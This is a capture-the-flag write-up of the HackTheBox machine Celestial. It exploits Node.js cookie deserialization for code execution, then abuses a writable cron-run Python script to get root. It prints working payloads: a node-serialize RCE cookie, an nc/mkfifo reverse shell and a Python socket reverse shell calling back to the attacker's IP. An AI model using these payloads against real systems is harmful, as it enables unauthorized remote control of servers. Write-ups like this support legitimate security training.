---
title: "HackTheBox - Celestial"
author: Nasrallah
description: ""
date: 2023-05-29 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, nodejs, cronjob, python, deserialization]
img_path: /assets/img/hackthebox/machines/celestial
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Celestial](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). We exploit a deserialization vulnerability in a node.js website and get foothold. For root we find a cronjob running a python script that we can write to, so we add a python reverse shell and get root privileges.

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.85
Host is up (1.1s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

```

There is a web server on port 3000 running node.js.

### Web

Let's check the web server.

![](1.png)

It gave us 404, refreshing the page gives something different.

![](2.png)

The reason for that is that we got a cookie from the website.

![](3.png)

The cookie looks base64 encoded, let's try to decode it.

```json
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

We can see different key/value pairs, two of them get returned to us: `username` and `num`.

## **Foothold**

Since this is `Node.js`, let's see if it's vulnerable to Deserialization attack

I found the following payload in [PayloadsAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md)

```js
_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 4 10.10.17.90', function(error,stdout, stderr) { console.log(stdout) });}()
```

We replace `dummy` with the code above:

```json
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 5 10.10.17.90', function(error,stdout, stderr) { console.log(stdout) });}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

And base64 encode the payload.

```terminal
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDUgMTAuMTAuMTcuOTAnLCBmdW5jdGlvbihlcnJvcixzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSIsImNvdW50cnkiOiJJZGsgUHJvYmFibHkgU29tZXdoZXJlIER1bWIiLCJjaXR5IjoiTGFtZXRvd24iLCJudW0iOiIyIn0=
```

I tried multiple command like `id` and `uname` but didn't get anything back, so I edited the command to `ping` to see if it get's executed and we don't get a reply.

![](4.png)

We received the ICMP packets, which means the target reach us.

Now let's replace the `ping -c 10.10.10.10` command with a reverse shell. I used `nc mkfifo`.

```json
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 9000 >/tmp/f', function(error,stdout, stderr) { console.log(stdout) });}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

Encode the payload, setup a listener and send the request.

![](5.png)

We got a shell as `sun`, let's upgrade to a fully tty shell using python.

```terminal
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
sun@celestial:~/.ssh$ export TERM=xterm
export TERM=xterm
sun@celestial:~/.ssh$ ^Z
zsh: suspended  nc -lvnp 9000
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/www]
└──╼ $ stty raw -echo; fg                                                                                                                           148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 9000

sun@celestial:~/.ssh$ 

```

## **Privilege Escalation**

Running `pspy64` we see a cronjob executing a python script

![](6.png)

The script is owned by `sun` so we can edit it as we like.

We add the following script to the file and wait for a reverse shell.

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.90",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![](7.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).